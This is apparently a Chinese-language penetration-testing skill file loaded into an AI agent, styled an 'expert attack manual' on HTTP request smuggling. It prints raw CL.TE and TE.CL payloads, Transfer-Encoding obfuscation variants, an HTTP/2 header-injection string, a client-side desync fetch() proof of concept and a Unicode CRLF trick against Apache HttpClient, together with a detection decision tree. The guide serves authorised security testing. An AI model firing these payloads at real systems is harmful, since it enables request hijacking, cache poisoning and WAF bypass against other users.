---
name: request-smuggling
description: HTTP请求走私和不同步测试。当前代理、CDN或负载均衡器与源端在消息帧（Content-Length与Transfer-Encoding）上存在分歧，或在HTTP/2→HTTP/1转换时，或探索通过浏览器获取管道实现客户端不同步时使用。
---

# 技能：HTTP 请求走私 — 专家攻击手册

> **AI 加载指令**：专家级 HTTP 不同步技术。涵盖 CL.TE、TE.CL、TE.TE 混淆变种，HTTP/2 降级和伪头部混淆，客户端不同步（浏览器 `fetch` 管道），以及工具辅助模糊测试。假设熟悉原始 HTTP/1.1 帧定和反向代理拓扑。这不是“头部注入”——它是**消息边界不一致**。

路由提示：当怀疑 CDN/反向代理和源站对请求边界不一致时加载此技能，或在 H2 到 H1 降级过程中出现异常连接时加载。

## 0. 相关路由

- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) 当 HTTP 客户端库为 **Apache HttpClient <= 4.5.9** (HTTPCLIENT-1974/1978) — 将 `瘍瘊` (U+760D U+760A, 低字节 `\r\n`) 注入头部值会导致底层字符到字节的写入器发出字面 CRLF，在源站处分割请求而不依赖 CL/TE 不一致

## 1. 快速入门

### CL.TE 首次探测（前端信任 CL，后端信任分块）

假设：前端优先考虑 `Content-Length`，后端优先考虑 `Transfer-Encoding: chunked`。使用一个非常短的 CL，使前端接受假结束，而后端继续分块解析并将剩余字节留给下一个请求。

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

- 前端根据 `Content-Length: 13` 只读取 13 字节（即 `0\r\n\r\nSMUGGLED`，总共 13 字节）并认为请求完成。
- 后端按分块解析：在 `0` 结束分块后，它将 **`SMUGGLED` 及之后** 视为**下一个请求**的起始字节流。

### TE.CL 首次探测（前端信任分块，后端信任 CL）

假设：前端解析分块，后端只读取 `Content-Length`。设置**CL 等于分块长度行的字节数**（通常 `4`：两个十六进制字符 + `\r\n`），使后端只消费长度行并将剩余字节缓冲以拼接后续请求。

在分块中嵌入第二个请求（所有行尾都是**CRLF**；十六进制分块长度 `35` = 53 字节）：

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target.example
Foo: x

0


```

在网络上，分块正文必须正好是 53 字节；如果你更改路径/头部，请重新计算分块长度并相应更新十六进制长度行。

### 安全提示

仅在**授权范围内**测试；并发走私会污染连接池、损坏缓存或影响其他租户。优先选择隔离环境或低流量时段。

---

## 1. 核心概念

**定义**：两个（或更多）HTTP 处理实体在**同一 TCP/TLS 流**中对请求一结束和请求二开始的位置**不一致**，允许攻击者在一个逻辑请求中包含**部分或全部**第二个请求。

```
  客户端          前端（代理/WAF）              后端（源站）
     |                     |                            |
     |==== 请求 A+B ===>|                            |
     |                     | 解析边界 #1         | 解析边界 #2
     |                     |         \                  |         /
     |                     |          不同的分割点
     |                     |                            |
     v                     v                            v
                   请求 A (所见)              请求 A' + 走私的 B
```

**与 CRLF 注入的区别**：CRLF 通常注入到**响应**或**头部行**中；走私针对 RFC 7230 消息帧实现的**差异**（`Content-Length` / `chunked`）。

**高价值影响**：WAF 规则绕过（走私的正文在前端请求中不可见），在共享源站连接上劫持其他用户的请求（队列中毒），缓存中毒协助，以及认证边界混淆。

---

## 2. CL.TE 漏洞

**模式**：前端信任 **`Content-Length`**；后端信任 **`Transfer-Encoding: chunked`**。

**精确示例**（与 §0 相同）: `Content-Length: 13` 和 `Transfer-Encoding: chunked` 都存在，正文是：

```text
0\r\n\r\nSMUGGLED
```

字节计数：`0` + `\r\n` + `\r\n` + `SMUGGLED` = 13。

**后端视角**：分块流在 `0\r\n\r\n` 结束；如果 `SMUGGLED` 以 `METHOD SP` 或其他有效请求前缀开头，它将成为一个**走私的请求行前缀**。

**调整**：如果目标是敏感于重复头部、大小写或空格，最小化调整 `Transfer-Encoding` 变体（见 §4）以保留语义，以匹配前端忽略 TE 而后端执行 TE 的组合。

---

## 3. TE.CL 漏洞

**模式**：前端解析**分块**；后端只读取 **`Content-Length`**（或太短的 CL）。

**意图**：前端将整个恶意字节流视为正文；后端读取 CL 长度，将剩余字节缓冲以拼接后续合法请求。

**完整的 TE.CL 嵌入第二个请求**（与 §0 同属一类；`Content-Length: 4` + 第一个分块长度行 `35\r\n`）：

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target.example
Foo: x

0


```

解释：

- **后端 (CL)**：从消息正文开头读取 4 字节 -> `3` `5` `\r` `\n`，标记正文完成，并将剩余字节留在 TCP 读取缓冲区中。
- **前端 (TE)**：解析完整流作为分块，并将 `GET /admin...` 作为已关闭第一个请求的正文内容（产品相关）；与后端边界解释的 mismatch 形成 TE.CL。

对于更长的走私（例如 `POST` + `Content-Length: 11` + `x=1`），分块长度约为 `76`（十六进制 `0x76` = 118 字节）；`Content-Length: 4` 仍然可以将后端锁定为只读取长度行。

**实用提示**：分块长度必须是有效的十六进制；第二个请求必须符合目标对 Host、路径和会话 cookie 的预期；时间窗口和连接重用策略决定了你是否会命中另一个用户的请求。

---

## 4. TE.TE 漏洞

**模式**：前端和后端都声称处理 `Transfer-Encoding`，但不同于此 TE 值有效或有效 -> 仍然产生等效不同步，其中一方看到分块而另一方不看到。

使用以下 **8 混淆变种** 探测解析差异（单行显示；`\t` 表示真实的制表符）：

```http
Transfer-Encoding: xchunked
```

```http
Transfer-Encoding : chunked
```

```http
Transfer-Encoding: chunked
Transfer-Encoding: chunked
```

```http
Transfer-Encoding: x
```

```http
Transfer-Encoding:[TAB]chunked
```
（将 `[TAB]` 替换为真实的 `\x09`。）

```http
 Transfer-Encoding: chunked
```
（行首有一个空格。）

```http
X: X
Transfer-Encoding: chunked
```
（前一行值是 `X`，下一行以 `Transfer-Encoding:` 开头；这使用**行延续/宽松头部解析**，所以一个跳过可能会错误地合并或分割行；`X` 和 `Transfer-Encoding` 之间的分隔符可能是 `\n` 或 `\r\n`，具体取决于目标堆栈。）

```http
Transfer-Encoding
: chunked
```
（字段名和冒号位于**不同的物理行**上；某些解析器仍然将其视为有效的 `Transfer-Encoding: chunked`。）

**策略**：对于每个（前端，后端）对，枚举哪一方接受每个变体作为 `chunked`，然后使用 §2/§3 映射到等效 CL.TE 或 TE.CL。

---

## 5. HTTP/2 请求走私

### H2 -> H1 降级

常见场景：边缘支持 HTTP/2，源站使用 HTTP/1.1。如果实现不严格规范化头部字段和正文边界，你可能会观察到：

- 不正确的伪头部到常规头部映射顺序；
- 禁止的头部（如某些 `Connection` 组合）被错误转发；
- 复制头部合并规则与源站不一致。

### 伪头部/头部注入走私（概念载荷）

攻击面来自下游 H1 解析器将某些字节视为**新请求的开始**。常见的科研/CTF 方法是在一个层忽略但另一个层按字面意义处理的头部值中放置接近请求的字节：

```text
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: target
```

**含义**：如果一个跳过在头部值中保留完整字符串，而下一个跳过在 H1 重建过程中错误分割，解析可能会在 `\r\n\r\n` 开始一个新的 `GET / HTTP/1.1`。

**测试方向**：

- H2 中 `Transfer-Encoding` / `Content-Length` 的重复和大小写处理；
- 降级行为时 `:method` 或 `:path` 包含异常字符；
- 隧道或扩展 CONNECT 与走私的交互。

---

## 6. 客户端不同步

**场景**：浏览器请求正文处理与中间件/源站不同，或**`no-cors` + 预检豁免**允许创建类似经典 CL.TE/TE.CL 的队列效果（架构相关）。

**HEAD + GET 链**：某些堆栈历史上错误处理 HEAD 响应正文、后续管道化或连接重用；使用具体浏览器版本和目标代理行为进行验证。

**JavaScript POC 形状**（说明性：将正文设置为包含 `GET` 的原始字节，`no-cors` 和凭证）：

```javascript
fetch("https://target.example/vulnerable", {
  method: "POST",
  mode: "no-cors",
  credentials: "include",
  body: "GET /admin HTTP/1.1\r\nHost: target.example\r\n\r\n"
});
```

**注意**：浏览器安全模型限制了直接可读性；成功通常表现为对同一连接上其他请求的副作用或异常服务器日志/行为，而不是直接读取响应。结合 SOP、CORS 和扩展/代理因素进行评估。

---

## 7. 工具

| 工具 | 目的 |
|------|------|
| **Burp Suite — HTTP 请求走私器** (BApp Store) | 自动不同步检测、常见变体、时间差检查 |
| **defparam/smuggler** (GitHub) | 批量生成/发送走私探测的 Python 脚本 |
| **dhmosfunk/simple-http-smuggler-generator** (GitHub) | 快速组装原始 CL.TE / TE.CL 消息模板 |

**使用建议**：首先被动确认一个**前端 + 源站**的两跳路径，然后选择最小干扰的探测，并在生产中降低并发。

---

## 8. 检测决策树

```
                        开始：路径中存在反向代理 / CDN？
                                    |
                    否 -------------+------------- 是
                    |                               |
            低级经典走私                    |
            （仍测试 H2 不同步）                   v
                                            你能同时发送 TE + CL 吗？
                                                    |
                              否 -------------------+------------------- 是
                              |                                         |
                      测试 H2 仅问题                    前端优先考虑什么？
                      (伪头部、重置)                            |
                                        +-------------------------------+-------------------------------+
                                        |                               |                               |
                                   CL 赢得                          TE 赢得                         错误 /
                                        |                               |                          连接
                                        v                               v                               |
                                   CL.TE 探测                    TE.CL 探测                    TE.TE 混淆
                                   (§0,2)                       (§0,3)                       (§4)
                                        |                               |                               |
                                        v                               v                               v
                              时间 / 内容 /                    调整分块                     成对矩阵：
                              队列中毒信号？                            尺寸 + CL                      哪个跳过接受
                              (§5)                            对齐                       哪个变体?
                                        |                               |                               |
                                        +-------------------------------+-------------------------------+
                                                                        |
                                                                        v
                                                              用第二个请求走私确认
                                                              (重放安全)
                                                              或 Collaborator 风格的侧信号
```

---

### 高级参考

当您需要时，也加载 [H2_SMUGGLING_VARIANTS.md](./H2_SMUGGLING_VARIANTS.md)：
- H2.CL 和 H2.TE 变体，带字节级载荷示例
- CL.0（连接关闭不同步）— 技巧和检测
- 胖 GET 请求走私（正文在 GET 请求中）
- 请求走私 → 缓存中毒链（响应队列不一致）
- 客户端不同步（CSD）通过浏览器 Fetch API 和 JavaScript POC 模板
- CDN/反向代理产品行为矩阵（HAProxy、Nginx、Apache、Cloudflare、AWS ALB、Envoy、Varnish 等）

---

## 12. 相关路由

- **输入进入解释器/查询语言/模板**（不是 HTTP 帧定）-> [注入测试路由](../injection-checking/SKILL.md)（然后深入 XSS、SQLi、SSTI 等）。
- **响应头部分割 / Location CRLF** -> [CRLF 注入](../crlf-injection/SKILL.md)。
- **缓存和路径键混淆** -> [Web 缓存欺骗](../web-cache-deception/SKILL.md)。

一旦确认是**HTTP 消息边界**问题而不是参数注入，**停留在该技能**以避免误路由到一般注入工作流。
